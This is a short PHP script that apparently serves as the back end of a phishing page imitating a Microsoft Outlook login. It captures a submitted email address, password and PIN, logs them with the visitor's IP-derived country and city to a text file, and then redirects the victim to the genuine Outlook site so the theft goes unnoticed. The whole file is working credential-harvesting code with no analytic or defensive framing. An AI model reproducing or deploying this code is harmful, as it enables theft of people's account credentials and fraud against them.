<?php
@session_start();
ini_set("display_errors", 0);
$ip = $_SERVER['REMOTE_ADDR'];
$k1 = $_POST['af'];
$k2 = $_POST['af2'];
$k3 = $_POST['af3'];

if (isset($k1) && isset($k2) && isset($k3)) {
    $dedon = json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));

    $country = $dedon->country;
    $city = $dedon->city;

    $time = date('Y-m-d H:i:s');
    $dat = fopen('gabopru.txt', 'a');
    fwrite($dat, "|| Cor: $k1 - Ctra: $k2 - P1N: $k3 - $country $city $time\n|| -------------------------------\n");
    fclose($dat); // No olvides cerrar el archivo después de escribir en él.
    header("Location: https://outlook.live.com/owa/");
    exit;
}
?>
</body>
</html>
